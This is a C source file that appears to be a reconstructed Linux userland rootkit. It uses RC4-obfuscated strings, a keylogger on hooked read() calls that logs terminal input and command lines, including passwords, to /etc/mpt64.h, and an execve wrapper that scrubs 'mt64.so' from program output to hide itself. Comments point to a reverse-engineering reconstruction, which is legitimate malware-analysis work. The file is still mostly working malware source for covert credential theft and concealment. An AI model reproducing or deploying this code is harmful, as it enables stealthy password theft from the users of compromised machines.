#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/stat.h>
#include <sys/wait.h>

#include "hooks.h"
#include "rc4.h"
#include "utils.h"

size_t strstrmem(char *s1, size_t len, char *s2) {
  int j = 0;

  for (size_t i = 0; i < len; i++) {
    if (s1[i] == s2[j]) {
      j++;
      if (s2[j] == '\0')
        return 1;
    }
    else j = (s1[i] == *s2);
  }

  return 0;
}

void erasefree(char *str) {
  if (str) {
    memset(str, 0, strlen(str));
    free(str);
  }
}

#define PASSWD_KEY_ENC "\x34\xB7\x93\x4D\xF4\x59\x89\xDF\xB4" \
                       "\x3C\x43\xF2\x61\x36"

char *savepasswd(char *path, char *passwd) {
  char passwd_key[16];
  char passwd_key2[16];
  int fd;
  int passwd_len;

  fd = openfile(path);
  if (fd == -1)
    return (char *)-1;

  passwd_len = strlen(passwd);
  // "caixauniqsearch"
  strcpy(passwd_key, PASSWD_KEY_ENC);
  rc4(key, passwd_key, 15);
  rc4(passwd_key, passwd, passwd_len);
  if (!search_line(fd, passwd, passwd_len)) {
    write(fd, passwd, passwd_len);
    write(fd, "\0\0\0\0", 4);
  }

  close(fd);
  strcpy(passwd_key2, PASSWD_KEY_ENC);
  return rc4(rc4(key, passwd_key2, 15), passwd, passwd_len);
}

int openfile(char *path) {
  int fd = open(path, O_RDWR);
  if (fd == -1) {
    fd = open(path, O_NONBLOCK | O_RDWR, 0644);
    fchmod(fd, 0666);
  }
  return fd;
}

int search_line(int fd, char *str, int len) {
  char buf[512];
  int j = 0;
  int v11 = 0;
  int v12 = 0;

  for (ssize_t read_count = read(fd, buf, 512);
       /* internal condition */;
       read_count = read(fd, buf, 512)) {
    // nothing left to read
    if (read_count <= 0)
      break;

    for (ssize_t i = 0; i < read_count; i++) {
      if (v12 && buf[i] != '\0') {
        v11 = 1;
      }
      else if (!v12 || buf[i]) {
        if (buf[i] != str[j++] || len == j) {
          v12 = 1;
        }
      }
      else if (++v11 == 4) {
        if (len == j)
          return 1;
        v11 = 0;
        v12 = 0;
        j = 0;
      }
    }
  }
  return 0;
}

char *strchr_reverse(char *str, char c) {
  while (*str) {
    if (*str == c)
      return str;
    str--;
  }

  return NULL;
}

int endswith(char *s1, int len1, char *s2, int len2) {
  int j = len2 - 1;

  for (int i = len1; i >= 0 && s1[i] == s2[j]; i--) {
    if (--j == -1)
      return 1;
  }

  return 0;
}

extern execve_fn orig_execve;
#define MT64_SO_ENC "\x3A\xA2\xCC\x01\xBB\x5F\x88"

int fake_trace_objects(const char *pathname, char *const argv[],
                       char *const envp[]) {
  int status;
  int pipefd[2];
  char mt64_so[8];
  int size;
  int readc;
  int i;
  char *buf;
  pid_t pid;
  char *mt64_substr;
  char *linebreak_pos;
  char *linebreak_pos_rv;

  pipe(pipefd);
  pid = fork();
  if (pid == 0) {
    close(pipefd[0]);
    dup2(pipefd[1], 1);
    dup2(pipefd[1], 2);
    if (pipefd[1] > 2)
      close(pipefd[1]);

    orig_execve(pathname, argv, envp);
    exit(errno);
  }
  if (pid == -1)
    return -1;

  close(pipefd[1]);
  size = 1024 + 1;
  i = 1;
  buf = malloc(1024 + 1);
  buf[0] = '\0';
  while (1) {
    readc = read(pipefd[0], &buf[i], size - 1 - i);
    if (readc <= 0)
      break;
    i += readc;
    if (size - 1 <= i) {
      size += 1024;
      // really not the proper way of using realloc
      buf = realloc(buf, size);
    }
  }

  close(pipefd[0]);
  buf[i] = '\0';
  // "mt64.so"
  strcpy(mt64_so, MT64_SO_ENC);
  mt64_substr = strstr(&buf[1], rc4(key, mt64_so, 7));
  if (mt64_substr) {
    linebreak_pos = strchr(mt64_substr, '\n');
    linebreak_pos_rv = strchr_reverse(mt64_substr, '\n');
    if (linebreak_pos_rv == NULL)
      linebreak_pos_rv = &buf[1];
    strcpy(linebreak_pos_rv, linebreak_pos);
  }

  printf("%s", &buf[1]);
  free(buf);
  waitpid(pid, &status, 0);
  if (status == 0)
    exit(0);

  errno = (status & 0xFF00) >> 8;
  return -1;
}

#define PROC_SELF_FD_D_ENC "\x78\xA6\x88\x5A\xF6\x03\x94\xD3\xA9\x29\x09\xF5\x77\x7A\x4D\x0B"
#define PROC_ENC "\x78\xA6\x88\x5A\xF6"

bool check_proc(DIR *dirp) {
  char buf[16];
  char s[64];
  char proc_self_fd_d[17];
  char proc[6];
  int fd;
  ssize_t size;

  fd = dirfd(dirp);
  if (fd == -1)
    return 0;

  // "/proc/self/fd/%d"
  strcpy(proc_self_fd_d, PROC_SELF_FD_D_ENC);
  sprintf(s, rc4(key, proc_self_fd_d, 16), fd);
  size = readlink(s, buf, 6);
  if (size != 5)
    return 0;

  s[5] = '\0';
  // "/proc"
  strcpy(proc, PROC_ENC);
  //     strcmp("/proc",           s) == 0;
  return strcmp(rc4(key, proc, 5), s) == 0;
}

int index_5914;
unsigned char pw_5911[4096];
int times_5915;
char *cmdline_5912;
char *addr_5913;
uint32_t enable_hook_5776;

#define STR_PIPE_STR_ENC "\x72\xA5\x86\x10\xE6\x26"
#define ETC_MPT64_H_ENC "\x78\xB3\x8E\x56\xBA\x41\x97\xC2\xF3\x7B\x08\xFB"

uint32_t enable_hook_5776;

int keylogger(int fd, uint8_t *buf, size_t count, uint32_t *enable_switch) {
  int res;
  char str_pipe_str[7];
  char etc_mpt64_h[13];

  if (!isatty(fd))
    return 0;

  for (size_t i = 0;; i++) {
    int max_len;
    char *s;

    res = i;
    if (i >= count)
      break;

    pw_5911[index_5914] = buf[i];
    if (pw_5911[index_5914] == '\0')
      pw_5911[index_5914] = '*';

    index_5914++;
    if (buf[i] == '\n' || buf[i] == '\r' || index_5914 == 4095) {
      if (pw_5911[index_5914 - 1] == '\n')
        index_5914--;

      pw_5911[index_5914] = '\0';
      if (times_5915 == 0)
        cmdline_5912 = log_cmd_line();

      max_len = index_5914 + 12;
      max_len += cmdline_5912 != NULL ? strlen(cmdline_5912) : 6;
      max_len += addr_5913 != NULL ? strlen(addr_5913) : 6;
      s = malloc(max_len);
      if (s != NULL) {
        // "%s|%s\n"
        strcpy(str_pipe_str, STR_PIPE_STR_ENC);
        snprintf(s, max_len, rc4(key, str_pipe_str, 12),
                 cmdline_5912, pw_5911);
        // "/etc/mpt64.h"
        strcpy(etc_mpt64_h, ETC_MPT64_H_ENC);
        savepasswd(rc4(key, etc_mpt64_h, 12), s);
        erasefree(s);
      }

      index_5914 = 0;
      // yes, this is a bug in the original code
      memset(pw_5911, 0, index_5914);
      times_5915++;
      if (times_5915 == 2) {
        erasefree(cmdline_5912);
        erasefree(addr_5913);
        res = (int)enable_switch;
        *enable_switch = 1;
        return res;
      }
    }
  }

  return res;
}

#define PROC_SELF_CMDLINE_ENC "\x78\xA6\x88\x5A\xF6\x03\x94\xD3\xA9\x29\x09\xF0\x7E\x31\x04\x06\xD8\x50"

extern read_fn orig_read;

char *log_cmd_line(void) {
  char buf[1024];
  char proc_self_cmdline[19];
  char *ptr;
  size_t size;
  int idx;
  int i;
  int fd;
  size_t current_size;

  ptr = NULL;
  size = 0;
  idx = 0;
  // "/proc/self/cmdline"
  strcpy(proc_self_cmdline, PROC_SELF_CMDLINE_ENC);
  fd = open(rc4(key, proc_self_cmdline, 18), O_RDONLY);
  if (fd == -1)
    return NULL;

  while (1) {
    void *tmp;

    current_size = orig_read(fd, buf, 1024);
    if (current_size <= 0)
      break;
    size += current_size;
    tmp = realloc(ptr, size + 1);
    if (tmp == NULL)
      break;

    ptr = tmp;
    for (i = 0; (int)current_size > i; i++) {
      if (buf[i] == '\0')
        buf[i] = ' ';
      ptr[idx] = buf[i];
      idx++;
    }
  }

  if (idx != 0)
    ptr[idx] = 0;

  close(fd);
  return ptr;
}
